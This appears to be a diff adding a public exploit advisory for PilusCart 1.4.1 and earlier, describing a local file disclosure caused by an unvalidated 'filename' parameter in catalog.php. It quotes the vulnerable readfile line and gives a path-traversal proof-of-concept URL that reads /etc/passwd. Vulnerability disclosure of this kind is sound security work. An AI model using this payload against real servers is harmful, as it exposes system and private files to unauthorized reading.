@@ -1,0 +1,19 @@
+# Exploit Title: PilusCart <= 1.4.1 - Local File Disclosure
+# Date: 29 August 2019
+# Exploit Author: Damian Ebelties (https://zerodays.lol/)
+# Vendor Homepage: https://sourceforge.net/projects/pilus/
+# Version: <= 1.4.1
+# Tested on: Ubuntu 18.04.1
+
+The e-commerce software 'PilusCart' is not validating the 'filename' passed correctly,
+which leads to Local File Disclosure.
+
+As of today (29 August 2019) this issue is unfixed.
+
+Vulnerable code: (catalog.php on line 71)
+
+    readfile("$direktori$filename");
+
+Proof-of-Concept:
+
+    https://domain.tld/catalog.php?filename=../../../../../../../../../etc/passwd
